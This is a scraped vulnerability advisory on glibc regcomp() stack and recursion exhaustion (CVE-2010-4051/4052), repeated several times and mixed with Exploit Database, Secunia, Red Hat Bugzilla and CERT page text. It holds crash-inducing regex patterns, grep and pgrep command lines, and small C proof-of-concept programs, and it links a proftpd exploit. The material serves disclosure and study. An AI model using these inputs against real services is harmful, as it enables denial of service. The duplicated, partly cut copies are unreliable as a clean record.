[ GNU libc/regcomp(3) Multiple Vulnerabilities ]
Author: Maksymilian Arciemowicz
http://cxib.net/
Date:
- - Dis.: 01.10.2010
- - Pub.: 07.01.2011
CERT: VU#912279
CVE:
CVE-2010-4051
CVE-2010-4052
Affected (tested):
- - Ubuntu 10.10
- - Slackware 13
- - Gentoo 18.10.2010
- - FreeBSD 8.1 (grep(1))
- - NetBSD 5.0.2 (grep(1))
Exploit for proftpd:
http://cxib.net/stuff/proftpd.gnu.c
- --- 0.Description ---
The GNU C library is used as the C library in the GNU system and most systems with the Linux kernel.
# define RE\_DUP\_MAX (0x7fff)
regcomp() is used to compile a regular expression into a form that is suitable for subsequent regexec() searches.
- --- 1. RE\_DUP\_MAX overflow ---
The main problem exists in regcomp(3) function of GNU libc implementation. Let`s try understand..
- ---
int
regcomp (preg, pattern, cflags)
regex\_t \*\_\_restrict preg;
const char \*\_\_restrict pattern;
int cflags;
{
- ---
if we use '{', token type will be OP\_OPEN\_DUP\_NUM.
- ---
/\* This function parse repetition operators like "\*", "+", "{1,3}" etc. \*/
static bin\_tree\_t \*
parse\_dup\_op (bin\_tree\_t \*elem, re\_string\_t \*regexp, re\_dfa\_t \*dfa,
re\_token\_t \*token, reg\_syntax\_t syntax, reg\_errcode\_t \*err)
{
bin\_tree\_t \*tree = NULL, \*old\_tree = NULL;
int i, start, end, start\_idx = re\_string\_cur\_idx (regexp);
re\_token\_t start\_token = \*token;
if (token->type == OP\_OPEN\_DUP\_NUM)
{
end = 0;
start = fetch\_number (regexp, token, syntax); <===== CONVERT VALUE
- ---
let`s see fetch\_number =>
- ---
static int
fetch\_number (re\_string\_t \*input, re\_token\_t \*token, reg\_syntax\_t syntax)
{
int num = -1;
unsigned char c;
while (1)
{
fetch\_token (token, input, syntax);
c = token->opr.c;
if (BE (token->type == END\_OF\_RE, 0))
return -2;
if (token->type == OP\_CLOSE\_DUP\_NUM || c == ',')
break;
num = ((token->type != CHARACTER || c < '0' || '9' < c || num == -2)
? -2 : ((num == -1) ? c - '0' : num \* 10 + c - '0'));
num = (num > RE\_DUP\_MAX) ? -2 : num;
}
return num;
}
- ---
now see regex.h to know, what value have RE\_DUP\_MAX
- ---
/\* Maximum number of duplicates an interval can allow. Some systems
(erroneously) define this in other header files, but we want our
value, so remove any previous define. \*/
# ifdef RE\_DUP\_MAX
# undef RE\_DUP\_MAX
# endif
/\* If sizeof(int) == 2, then ((1 << 15) - 1) overflows. \*/
# define RE\_DUP\_MAX (0x7fff)
#endif
- ---
calc\_eclosure\_iter() will call to calc\_eclosure\_iter() match time. and
crash in malloc(3). Simple Recursion.
so we can't use value bigger 0x7fff in {n,}. regcomp(3) should return ERROR if we use more that one time '{' token.
They are many vectors attack
grep(1):
cx@cx64:~$ ls |grep -E ".\*{10,}{10,}{10,}{10,}{10,}"
Segmentation fault
pgrep(1):
cx@cx64:~$ pgrep ".\*{10,}{10,}{10,}{10,}{10,}"
Segmentation fault
bregex from bacula-director-common
cx@cx64:~$ bregex -f glob-0day.c
Enter regex pattern: .\*{10,}{10,}{10,}{10,}{10,}
Segmentation fault
whatis(1):
cx@cx64:~$ whatis -r ".\*{10,}{10,}{10,}{10,}{10,}"
Segmentation fault
and more like proftpd.
Simple crash for CVE-2010-4051

regcomp (&preg, fmt, REG\_EXTENDED);
return 0;
}

- --- 2. Stack Exhausion ---
This issue, may be also use to Denial of Service by stack exhausion
#ls |grep -E ".\*{10,}{10,}{111111,}"

int

// char fmt[]=".\*{10,}{10,}{10,}{10,}{10,}"; // CVE-2010-4051
regcomp (&preg, fmt, REG\_EXTENDED);
return 0;
}
- ---PoC2---
Such a pattern may lead to allocate a large memory area, or large execution time
As we can read in vsftpd/HACKING
- ---
- do not use libc features that are "complicated"
and may contain security holes. For example, you probably shouldn't
try to use regcomp() to compile an untrusted regular expression.
Regular expressions are just too complicated, and there are many
different libc's out there.
- ---
That's true. But the worst implementation of lib C is GNU. There is a huge difference using proftpd on NetBSD and Linux
- --- 3. Stack Exhausions ---
Stack Exhausions was found in GNU glibc.
- ---PoC3---
/bin/egrep "/(.\*+++++++++++++++++++++++++++++(\w+))/im" cx
- ---PoC3---
when more '+' that more allocated memory. But let's see next one

These vulnerabilities are not really dangerous. However, there is the possibility to use the DoS attack. An example might be an exploit for proftpd. Option 3 allows to exhaustion avaliable memory. In my opinion, the GNU should fix the problem.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Exploit for proftpd:
http://cxib.net/stuff/proftpd.gnu.c

- --- 0.Description ---
The GNU C library is used as the C library in the GNU system and most
systems with the Linux kernel.

# define RE_DUP_MAX (0x7fff)

regcomp() is used to compile a regular expression into a form that is
suitable for subsequent regexec() searches.

- --- 1. RE_DUP_MAX overflow ---
The main problem exists in regcomp(3) function of GNU libc implementation.
Let`s try understand..

- ---
int
regcomp (preg, pattern, cflags)
regex_t *__restrict preg;
const char *__restrict pattern;
int cflags;
{
- ---

if we use '{', token type will be OP_OPEN_DUP_NUM.

- ---
/* This function parse repetition operators like "*", "+", "{1,3}" etc.
*/

static bin_tree_t *
parse_dup_op (bin_tree_t *elem, re_string_t *regexp, re_dfa_t *dfa,
re_token_t *token, reg_syntax_t syntax, reg_errcode_t *err)
{
bin_tree_t *tree = NULL, *old_tree = NULL;
int i, start, end, start_idx = re_string_cur_idx (regexp);
re_token_t start_token = *token;

if (token->type == OP_OPEN_DUP_NUM)
{
end = 0;
start = fetch_number (regexp, token, syntax); <===== CONVERT VALUE
- ---

let`s see fetch_number =>

- ---
static int
fetch_number (re_string_t *input, re_token_t *token, reg_syntax_t syntax)
{
int num = -1;
unsigned char c;
while (1)
{
fetch_token (token, input, syntax);
c = token->opr.c;
if (BE (token->type == END_OF_RE, 0))
return -2;
if (token->type == OP_CLOSE_DUP_NUM || c == ',')
break;
num = ((token->type != CHARACTER || c < '0' || '9' < c || num == -2)
? -2 : ((num == -1) ? c - '0' : num * 10 + c - '0'));
num = (num > RE_DUP_MAX) ? -2 : num;
}
return num;
}
- ---

now see regex.h to know, what value have RE_DUP_MAX

- ---
/* Maximum number of duplicates an interval can allow. Some systems
(erroneously) define this in other header files, but we want our
value, so remove any previous define. */
# ifdef RE_DUP_MAX
# undef RE_DUP_MAX
# endif
/* If sizeof(int) == 2, then ((1 << 15) - 1) overflows. */
# define RE_DUP_MAX (0x7fff)
#endif
- ---

calc_eclosure_iter() will call to calc_eclosure_iter() match time. and
crash in malloc(3). Simple Recursion.

so we can't use value bigger 0x7fff in {n,}. regcomp(3) should return ERROR
if we use more that one time '{' token.

They are many vectors attack

grep(1):
cx@cx64:~$ ls |grep -E ".*{10,}{10,}{10,}{10,}{10,}"
Segmentation fault

pgrep(1):
cx@cx64:~$ pgrep ".*{10,}{10,}{10,}{10,}{10,}"
Segmentation fault

bregex from bacula-director-common
cx@cx64:~$ bregex -f glob-0day.c
Enter regex pattern: .*{10,}{10,}{10,}{10,}{10,}
Segmentation fault

whatis(1):
cx@cx64:~$ whatis -r ".*{10,}{10,}{10,}{10,}{10,}"
Segmentation fault

and more like proftpd.

int main(){
regex_t preg;

char fmt[]=".*{10,}{10,}{10,}{10,}{10,}"; CVE-2010-4051

regcomp (&preg, fmt, REG_EXTENDED);

return 0;
}
- ---PoC1---

- --- 2. Stack Exhausion ---
This issue, may be also use to Denial of Service by stack exhausion

#ls |grep -E ".*{10,}{10,}{111111,}"

- ---PoC2---
#include <regex.h>

int
main ()
{
regex_t preg;

char fmt[]=".*{10,}{10,}{10,}{10,}"; // CVE-2010-4052
// char fmt[]=".*{10,}{10,}{10,}{10,}{10,}"; // CVE-2010-4051

regcomp (&preg, fmt, REG_EXTENDED);

return 0;
}
- ---PoC2---

Such a pattern may lead to allocate a large memory area, or large execution
time

As we can read in vsftpd/HACKING

- ---
- do not use libc features that are "complicated"
and may contain security holes. For example, you probably shouldn't
try to use regcomp() to compile an untrusted regular expression.
Regular expressions are just too complicated, and there are many
different libc's out there.
- ---

That's true. But the worst implementation of lib C is GNU. There is a huge
difference using proftpd on NetBSD and Linux

- --- 3. Stack Exhausions ---
Stack Exhausions was found in GNU glibc.

- ---PoC3---
/bin/egrep "/(.*+++++++++++++++++++++++++++++(\w+))/im" cx
- ---PoC3---

when more '+' that more allocated memory. But let's see next one

cx@cx64:~$ /bin/egrep "/(.*+++++++++++++++++++++++++++++(\w+))/im" cx
Segmentation fault

These vulnerabilities are not really dangerous. However, there is the
possibility to use the DoS attack. An example might be an exploit for
proftpd. Option 3 allows to exhaustion avaliable memory. In my opinion, the
GNU should fix the problem.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

| [Description](show_bug.cgi?id=645859#c0)  Jan Lieskovsky    2010-10-22 17:01:05 UTC  ``` Maksymilian Arciemowicz reported a deficiency in the way glibc regular expression engine processed certain patterns. A local attacker could use this flaw to cause a denial of  service (crash due stack overflow).  Note: The above described behavior is a limitation of glibc regular expression engine. Regular expression matching  function is called recursively for certain types of patterns  (where subexpression using quantifier is nested inside of  another quantified expression), where long input can result  in deep recursion and exhaustion of all stack memory (i.e.  impact is limited to crash). Amount of stack memory available to glibc regular expression engine influences the size of input  that must be provided to trigger the crash. Alternatively,  expression can be modified to avoid quantification nesting,  or program modified to limit size of input passed to regular expression engine.

[ GNU libc/regcomp(3) Multiple Vulnerabilities ]
Author: Maksymilian Arciemowicz
http://cxib.net/
Date:
- - Dis.: 01.10.2010
- - Pub.: 07.01.2011
CERT: VU#912279
CVE:
CVE-2010-4051
CVE-2010-4052
Affected (tested):
- - Ubuntu 10.10
- - Slackware 13
- - Gentoo 18.10.2010
- - FreeBSD 8.1 (grep(1))
- - NetBSD 5.0.2 (grep(1))
Exploit for proftpd:
http://cxib.net/stuff/proftpd.gnu.c
- --- 0.Description ---
The GNU C library is used as the C library in the GNU system and most systems with the Linux kernel.
# define RE\_DUP\_MAX (0x7fff)
regcomp() is used to compile a regular expression into a form that is suitable for subsequent regexec() searches.
- --- 1. RE\_DUP\_MAX overflow ---
The main problem exists in regcomp(3) function of GNU libc implementation. Let`s try understand..
- ---
int
regcomp (preg, pattern, cflags)
regex\_t \*\_\_restrict preg;
const char \*\_\_restrict pattern;
int cflags;
{
- ---
if we use '{', token type will be OP\_OPEN\_DUP\_NUM.
- ---
/\* This function parse repetition operators like "\*", "+", "{1,3}" etc. \*/
static bin\_tree\_t \*
parse\_dup\_op (bin\_tree\_t \*elem, re\_string\_t \*regexp, re\_dfa\_t \*dfa,
re\_token\_t \*token, reg\_syntax\_t syntax, reg\_errcode\_t \*err)
{
bin\_tree\_t \*tree = NULL, \*old\_tree = NULL;
int i, start, end, start\_idx = re\_string\_cur\_idx (regexp);
re\_token\_t start\_token = \*token;
if (token->type == OP\_OPEN\_DUP\_NUM)
{
end = 0;
start = fetch\_number (regexp, token, syntax); <===== CONVERT VALUE
- ---
let`s see fetch\_number =>
- ---
static int
fetch\_number (re\_string\_t \*input, re\_token\_t \*token, reg\_syntax\_t syntax)
{
int num = -1;
unsigned char c;
while (1)
{
fetch\_token (token, input, syntax);
c = token->opr.c;
if (BE (token->type == END\_OF\_RE, 0))
return -2;
if (token->type == OP\_CLOSE\_DUP\_NUM || c == ',')
break;
num = ((token->type != CHARACTER || c < '0' || '9' < c || num == -2)
? -2 : ((num == -1) ? c - '0' : num \* 10 + c - '0'));
num = (num > RE\_DUP\_MAX) ? -2 : num;
}
return num;
}
- ---
now see regex.h to know, what value have RE\_DUP\_MAX
- ---
/\* Maximum number of duplicates an interval can allow. Some systems
(erroneously) define this in other header files, but we want our
value, so remove any previous define. \*/
# ifdef RE\_DUP\_MAX
# undef RE\_DUP\_MAX
# endif
/\* If sizeof(int) == 2, then ((1 << 15) - 1) overflows. \*/
# define RE\_DUP\_MAX (0x7fff)
#endif
- ---
calc\_eclosure\_iter() will call to calc\_eclosure\_iter() match time. and
crash in malloc(3). Simple Recursion.
so we can't use value bigger 0x7fff in {n,}. regcomp(3) should return ERROR if we use more that one time '{' token.
They are many vectors attack
grep(1):
cx@cx64:~$ ls |grep -E ".\*{10,}{10,}{10,}{10,}{10,}"
Segmentation fault
pgrep(1):
cx@cx64:~$ pgrep ".\*{10,}{10,}{10,}{10,}{10,}"
Segmentation fault
bregex from bacula-director-common
cx@cx64:~$ bregex -f glob-0day.c
Enter regex pattern: .\*{10,}{10,}{10,}{10,}{10,}
Segmentation fault
whatis(1):
cx@cx64:~$ whatis -r ".\*{10,}{10,}{10,}{10,}{10,}"
Segmentation fault
and more like proftpd.
Simple crash for CVE-2010-4051

regcomp (&preg, fmt, REG\_EXTENDED);
return 0;
}
- ---PoC1---
- --- 2. Stack Exhausion ---
This issue, may be also use to Denial of Service by stack exhausion
#ls |grep -E ".\*{10,}{10,}{111111,}"
- ---PoC2---
#include <regex.h>
int
main ()
{
regex\_t preg;
char fmt[]=".\*{10,}{10,}{10,}{10,}"; // CVE-2010-4052
// char fmt[]=".\*{10,}{10,}{10,}{10,}{10,}"; // CVE-2010-4051
regcomp (&preg, fmt, REG\_EXTENDED);
return 0;
}
- ---PoC2---
Such a pattern may lead to allocate a large memory area, or large execution time
As we can read in vsftpd/HACKING
- ---
- do not use libc features that are "complicated"
and may contain security holes. For example, you probably shouldn't
try to use regcomp() to compile an untrusted regular expression.
Regular expressions are just too complicated, and there are many
different libc's out there.
- ---
That's true. But the worst implementation of lib C is GNU. There is a huge difference using proftpd on NetBSD and Linux
- --- 3. Stack Exhausions ---
Stack Exhausions was found in GNU glibc.
- ---PoC3---
/bin/egrep "/(.\*+++++++++++++++++++++++++++++(\w+))/im" cx
- ---PoC3---
when more '+' that more allocated memory. But let's see next one

These vulnerabilities are not really dangerous. However, there is the possibility to use the DoS attack. An example might be an exploit for proftpd. Option 3 allows to exhaustion avaliable memory. In my opinion, the GNU should fix the problem.

| [Description](show_bug.cgi?id=645859#c0)  Jan Lieskovsky    2010-10-22 17:01:05 UTC  ``` Maksymilian Arciemowicz reported a deficiency in the way glibc regular expression engine processed certain patterns. A local attacker could use this flaw to cause a denial of  service (crash due stack overflow).  Note: The above described behavior is a limitation of glibc regular expression engine. Regular expression matching  function is called recursively for certain types of patterns  (where subexpression using quantifier is nested inside of  another quantified expression), where long input can result  in deep recursion and exhaustion of all stack memory (i.e.  impact is limited to crash). Amount of stack memory available to glibc regular expression engine influences the size of input  that must be provided to trigger the crash. Alternatively,  expression can be modified to avoid quantification nesting,  or program modified to limit size of input passed to regular expression engine.  Conclusion: Due the above described behavior Red Hat Security Response Team would not classify this deficiency to be a security issue.  References: [1] <http://www.kb.cert.org/vuls/id/912279> [2] <http://www.securityfocus.com/archive/1/515589> [3] <http://forums.cnet.com/7726-6132_102-5042238.html> [4] <http://secunia.com/advisories/42547/> [5] <http://securityreason.com/securityalert/8003>   ```  [Comment 3](show_bug.cgi?id=645859#c3)  Jan Lieskovsky    2010-11-30 14:09:20 UTC  ``` The CVE identifier of [CVE-2010-4051](https://access.redhat.com/security/cve/CVE-2010-4051) has been assigned for the crash due large values in an "{n,}" sequence issue.  The CVE identifier of [CVE-2010-4052](https://access.redhat.com/security/cve/CVE-2010-4052) has been assigned for the stack exhaustion issue.   ```  [Comment 5](show_bug.cgi?id=645859#c5)  Jan Lieskovsky    2011-01-10 15:40:18 UTC  ``` Full-disclosure post: [1] <http://seclists.org/fulldisclosure/2011/Jan/78>   ```  [Comment 6](show_bug.cgi?id=645859#c6)  Jan Lieskovsky    2011-01-10 16:00:23 UTC  ``` Statement:  Red Hat does not consider crash of client application, using regcomp()  or regexec() routines on untrusted input without preliminary checking  the input for the sanity, to be a security issue (the described deficiency  implies and is a known limitation of the glibc regular expression engine  implementation). The expressions can be modified to avoid quantification  nesting, or program modified to limit size of input passed to regular  expression engine. We do not currently plan to fix these flaws. If more  information becomes available at a future date, we may revisit these issues.   ```  [Comment 11](show_bug.cgi?id=645859#c11)  Jan Lieskovsky    2011-06-03 09:22:30 UTC  ``` These issues affect the versions of the glibc package, as shipped with Red Hat Enterprise Linux 4, 5, and 6.   ```  [Comment 13](show_bug.cgi?id=645859#c13)  Jan Lieskovsky    2011-06-03 09:40:49 UTC  ``` Closing as not a bug due conclusion in: [1] [https://bugzilla.redhat.com/show_bug.cgi?id=645859#c6](show_bug.cgi?id=645859#c6 "CLOSED NOTABUG - CVE-2010-4051 CVE-2010-4052 glibc: De-recursivise regular expression engine")   ``` |  |

## GNU libc regcomp() stack exhaustion denial of service

#### Vulnerability Note VU#912279

Original Release Date: 2010-12-07 | Last Revised: 2010-12-08

---

### Overview

The regcomp() function of GNU libc is susceptible to stack exhaustion which may result in a denial of service.

### Description

| It is possible to trigger deep recursion which results in stack exhaustion. An example trigger is: grep -E ".\*{10,}{10,}{10,}{10,}{10,}" |
| --- |

### Impact

| An attacker may be able to trigger a denial of service in applications that accept regular expressions. |
| --- |

### Solution

| We are currently unaware of a practical solution to this problem. |
| --- |

- - FreeBSD 8.1 (grep(1))
- - NetBSD 5.0.2 (grep(1))

Exploit for proftpd:
<http://cxib.net/stuff/proftpd.gnu.c>

- --- 0.Description ---
The GNU C library is used as the C library in the GNU system and most
systems with the Linux kernel.

# define RE_DUP_MAX (0x7fff)

regcomp() is used to compile a regular expression into a form that is
suitable for subsequent regexec() searches.

- --- 1. RE_DUP_MAX overflow ---
The main problem exists in regcomp(3) function of GNU libc
implementation. Let`s try understand..

- ---
int
regcomp (preg, pattern, cflags)
    regex_t *__restrict preg;
    const char *__restrict pattern;
    int cflags;
{
- ---

if we use '{', token type will be OP_OPEN_DUP_NUM.

- ---
/* This function parse repetition operators like "*", "+", "{1,3}" etc.  */

static bin_tree_t *
parse_dup_op (bin_tree_t *elem, re_string_t *regexp, re_dfa_t *dfa,
              re_token_t *token, reg_syntax_t syntax, reg_errcode_t *err)
{
  bin_tree_t *tree = NULL, *old_tree = NULL;
  int i, start, end, start_idx = re_string_cur_idx (regexp);
  re_token_t start_token = *token;

  if (token->type == OP_OPEN_DUP_NUM)
    {
      end = 0;
      start = fetch_number (regexp, token, syntax); <===== CONVERT VALUE
- ---

let`s see fetch_number =>

- ---
static int
fetch_number (re_string_t *input, re_token_t *token, reg_syntax_t syntax)
{
  int num = -1;
  unsigned char c;
  while (1)
    {
      fetch_token (token, input, syntax);
      c = token->opr.c;
      if (BE (token->type == END_OF_RE, 0))
        return -2;
      if (token->type == OP_CLOSE_DUP_NUM || c == ',')
        break;
      num = ((token->type != CHARACTER || c < '0' || '9' < c || num == -2)
             ? -2 : ((num == -1) ? c - '0' : num * 10 + c - '0'));
      num = (num > RE_DUP_MAX) ? -2 : num;
    }
  return num;
}
- ---

now see regex.h to know, what value have RE_DUP_MAX

- ---
/* Maximum number of duplicates an interval can allow.  Some systems
   (erroneously) define this in other header files, but we want our
   value, so remove any previous define.  */
# ifdef RE_DUP_MAX
#  undef RE_DUP_MAX
# endif
/* If sizeof(int) == 2, then ((1 << 15) - 1) overflows.  */
# define RE_DUP_MAX (0x7fff)
#endif
- ---

calc_eclosure_iter() will call to calc_eclosure_iter() match time. and
crash in malloc(3). Simple Recursion.

so we can't use value bigger 0x7fff in {n,}. regcomp(3) should return
ERROR if we use more that one time '{' token.

They are many vectors attack

grep(1):
cx@cx64:~$ ls |grep -E ".*{10,}{10,}{10,}{10,}{10,}"
Segmentation fault

pgrep(1):
cx@cx64:~$ pgrep ".*{10,}{10,}{10,}{10,}{10,}"
Segmentation fault

bregex from bacula-director-common
cx@cx64:~$ bregex -f glob-0day.c
Enter regex pattern: .*{10,}{10,}{10,}{10,}{10,}
Segmentation fault

whatis(1):
cx@cx64:~$ whatis -r ".*{10,}{10,}{10,}{10,}{10,}"
Segmentation fault

and more like proftpd.

#include <regex.h>

int main(){
  regex_t preg;

//  char fmt[]=".*{10,}{10,}{10,}{10,}"; // CVE-2010-4052
  char fmt[]=".*{10,}{10,}{10,}{10,}{10,}"; CVE-2010-4051

  regcomp (&preg, fmt, REG_EXTENDED);

  return 0;
}
- ---PoC1---

- --- 2. Stack Exhausion ---
This issue, may be also use to Denial of Service by stack exhausion

#ls |grep -E ".*{10,}{10,}{111111,}"

- ---PoC2---
#include <regex.h>

int
main ()
{
  regex_t preg;

  char fmt[]=".*{10,}{10,}{10,}{10,}"; // CVE-2010-4052
//  char fmt[]=".*{10,}{10,}{10,}{10,}{10,}"; // CVE-2010-4051

  regcomp (&preg, fmt, REG_EXTENDED);

  return 0;
}
- ---PoC2---

Such a pattern may lead to allocate a large memory area, or large
execution time

As we can read in vsftpd/HACKING

- ---
 - do not use libc features that are "complicated"
   and may contain security holes. For example, you probably shouldn't
   try to use regcomp() to compile an untrusted regular expression.
   Regular expressions are just too complicated, and there are many
   different libc's out there.
- ---

That's true. But the worst implementation of lib C is GNU. There is a
huge difference using proftpd on NetBSD and Linux

- --- 3. Stack Exhausions ---
Stack Exhausions was found in GNU glibc.

- ---PoC3---
 /bin/egrep "/(.*+++++++++++++++++++++++++++++(\w+))/im" cx
- ---PoC3---

when more '+' that more allocated memory. But let's see next one

- ---PoC4---

These vulnerabilities are not really dangerous. However, there is the
possibility to use the DoS attack. An example might be an exploit for
proftpd. Option 3 allows to exhaustion avaliable memory. In my opinion,
the GNU should fix the problem.
